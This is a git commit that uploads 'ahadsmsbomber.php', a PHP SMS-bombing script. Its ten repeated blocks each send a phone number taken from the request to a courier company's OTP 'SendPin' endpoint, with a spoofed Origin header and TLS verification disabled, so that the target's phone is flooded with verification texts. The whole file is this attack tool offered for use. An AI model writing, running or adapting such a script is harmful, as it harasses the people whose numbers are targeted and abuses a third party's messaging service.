4d319f5b2c7ffef44b8c8c4d231b8f2902b72053
nayem-48ai <150437672+nayem-48ai@users.noreply.github.com>
2024-11-11 10:06:32 +0600

    Add files via upload

---
+++ ahadsmsbomber.php
@@ -0,0 +1,400 @@
+<?php
+$phn = $_REQUEST["phone"];
+$url = "https://tracking.sundarbancourierltd.com/PreBooking/SendPin";
+
+$curl = curl_init($url);
+curl_setopt($curl, CURLOPT_URL, $url);
+curl_setopt($curl, CURLOPT_POST, true);
+curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+
+$headers = array(
+   "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
+   "Origin: https://www.paydtec.com",
+   "Content-Type: application/json",
+);
+curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
+
+
+$data = array(
+    "PreBookingRegistrationPhoneNumber" => "$phn",
+);
+
+$data = json_encode($data);
+
+curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
+
+//for debug only!
+curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
+curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
+
+$resp = curl_exec($curl);
+curl_close($curl);
+
+$resp = curl_exec($curl);
+curl_close($curl);
+echo 'SMS Sent Successfull By  Mohammad Ahad';
+
+
+?>
+
+
+<?php
+$phn = $_REQUEST["phone"];
+$url = "https://tracking.sundarbancourierltd.com/PreBooking/SendPin";
+
+$curl = curl_init($url);
+curl_setopt($curl, CURLOPT_URL, $url);
+curl_setopt($curl, CURLOPT_POST, true);
+curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+
+$headers = array(
+   "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
+   "Origin: https://www.paydtec.com",
+   "Content-Type: application/json",
+);
+curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
+
+
+$data = array(
+    "PreBookingRegistrationPhoneNumber" => "$phn",
+);
+
+$data = json_encode($data);
+
+curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
+
+//for debug only!
+curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
+curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
+
+$resp = curl_exec($curl);
+curl_close($curl);
+
+$resp = curl_exec($curl);
+curl_close($curl);
+echo '';
+
+
+?>
+
+
+<?php
+$phn = $_REQUEST["phone"];
+$url = "https://tracking.sundarbancourierltd.com/PreBooking/SendPin";
+
+$curl = curl_init($url);
+curl_setopt($curl, CURLOPT_URL, $url);
+curl_setopt($curl, CURLOPT_POST, true);
+curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+
+$headers = array(
+   "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
+   "Origin: https://www.paydtec.com",
+   "Content-Type: application/json",
+);
+curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
+
+
+$data = array(
+    "PreBookingRegistrationPhoneNumber" => "$phn",
+);
+
+$data = json_encode($data);
+
+curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
+
+//for debug only!
+curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
+curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
+
+$resp = curl_exec($curl);
+curl_close($curl);
+
+$resp = curl_exec($curl);
+curl_close($curl);
+echo '';
+
+
+?>
+
+
+<?php
+$phn = $_REQUEST["phone"];
+$url = "https://tracking.sundarbancourierltd.com/PreBooking/SendPin";
+
+$curl = curl_init($url);
+curl_setopt($curl, CURLOPT_URL, $url);
+curl_setopt($curl, CURLOPT_POST, true);
+curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+
+$headers = array(
+   "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
+   "Origin: https://www.paydtec.com",
+   "Content-Type: application/json",
+);
+curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
+
+
+$data = array(
+    "PreBookingRegistrationPhoneNumber" => "$phn",
+);
+
+$data = json_encode($data);
+
+curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
+
+//for debug only!
+curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
+curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
+
+$resp = curl_exec($curl);
+curl_close($curl);
+
+$resp = curl_exec($curl);
+curl_close($curl);
+echo '';
+
+
+?>
+
+<?php
+$phn = $_REQUEST["phone"];
+$url = "https://tracking.sundarbancourierltd.com/PreBooking/SendPin";
+
+$curl = curl_init($url);
+curl_setopt($curl, CURLOPT_URL, $url);
+curl_setopt($curl, CURLOPT_POST, true);
+curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+
+$headers = array(
+   "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
+   "Origin: https://www.paydtec.com",
+   "Content-Type: application/json",
+);
+curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
+
+
+$data = array(
+    "PreBookingRegistrationPhoneNumber" => "$phn",
+);
+
+$data = json_encode($data);
+
+curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
+
+//for debug only!
+curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
+curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
+
+$resp = curl_exec($curl);
+curl_close($curl);
+
+$resp = curl_exec($curl);
+curl_close($curl);
+echo '';
+
+
+?>
+
+
+<?php
+$phn = $_REQUEST["phone"];
+$url = "https://tracking.sundarbancourierltd.com/PreBooking/SendPin";
+
+$curl = curl_init($url);
+curl_setopt($curl, CURLOPT_URL, $url);
+curl_setopt($curl, CURLOPT_POST, true);
+curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+
+$headers = array(
+   "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
+   "Origin: https://www.paydtec.com",
+   "Content-Type: application/json",
+);
+curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
+
+
+$data = array(
+    "PreBookingRegistrationPhoneNumber" => "$phn",
+);
+
+$data = json_encode($data);
+
+curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
+
+//for debug only!
+curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
+curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
+
+$resp = curl_exec($curl);
+curl_close($curl);
+
+$resp = curl_exec($curl);
+curl_close($curl);
+echo '';
+
+
+?>
+
+
+<?php
+$phn = $_REQUEST["phone"];
+$url = "https://tracking.sundarbancourierltd.com/PreBooking/SendPin";
+
+$curl = curl_init($url);
+curl_setopt($curl, CURLOPT_URL, $url);
+curl_setopt($curl, CURLOPT_POST, true);
+curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+
+$headers = array(
+   "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
+   "Origin: https://www.paydtec.com",
+   "Content-Type: application/json",
+);
+curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
+
+
+$data = array(
+    "PreBookingRegistrationPhoneNumber" => "$phn",
+);
+
+$data = json_encode($data);
+
+curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
+
+//for debug only!
+curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
+curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
+
+$resp = curl_exec($curl);
+curl_close($curl);
+
+$resp = curl_exec($curl);
+curl_close($curl);
+echo '';
+
+
+?>
+
+
+
+<?php
+$phn = $_REQUEST["phone"];
+$url = "https://tracking.sundarbancourierltd.com/PreBooking/SendPin";
+
+$curl = curl_init($url);
+curl_setopt($curl, CURLOPT_URL, $url);
+curl_setopt($curl, CURLOPT_POST, true);
+curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+
+$headers = array(
+   "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
+   "Origin: https://www.paydtec.com",
+   "Content-Type: application/json",
+);
+curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
+
+
+$data = array(
+    "PreBookingRegistrationPhoneNumber" => "$phn",
+);
+
+$data = json_encode($data);
+
+curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
+
+//for debug only!
+curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
+curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
+
+$resp = curl_exec($curl);
+curl_close($curl);
+
+$resp = curl_exec($curl);
+curl_close($curl);
+echo '';
+
+
+?>
+
+
+
+<?php
+$phn = $_REQUEST["phone"];
+$url = "https://tracking.sundarbancourierltd.com/PreBooking/SendPin";
+
+$curl = curl_init($url);
+curl_setopt($curl, CURLOPT_URL, $url);
+curl_setopt($curl, CURLOPT_POST, true);
+curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+
+$headers = array(
+   "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
+   "Origin: https://www.paydtec.com",
+   "Content-Type: application/json",
+);
+curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
+
+
+$data = array(
+    "PreBookingRegistrationPhoneNumber" => "$phn",
+);
+
+$data = json_encode($data);
+
+curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
+
+//for debug only!
+curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
+curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
+
+$resp = curl_exec($curl);
+curl_close($curl);
+
+$resp = curl_exec($curl);
+curl_close($curl);
+echo '';
+
+
+?>
+
+
+
+<?php
+$phn = $_REQUEST["phone"];
+$url = "https://tracking.sundarbancourierltd.com/PreBooking/SendPin";
+
+$curl = curl_init($url);
+curl_setopt($curl, CURLOPT_URL, $url);
+curl_setopt($curl, CURLOPT_POST, true);
+curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+
+$headers = array(
+   "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
+   "Origin: https://www.paydtec.com",
+   "Content-Type: application/json",
+);
+curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
+
+
+$data = array(
+    "PreBookingRegistrationPhoneNumber" => "$phn",
+);
+
+$data = json_encode($data);
+
+curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
+
+//for debug only!
+curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
+curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
+
+$resp = curl_exec($curl);
+curl_close($curl);
+
+$resp = curl_exec($curl);
+curl_close($curl);
+echo '';
+
+
+?>
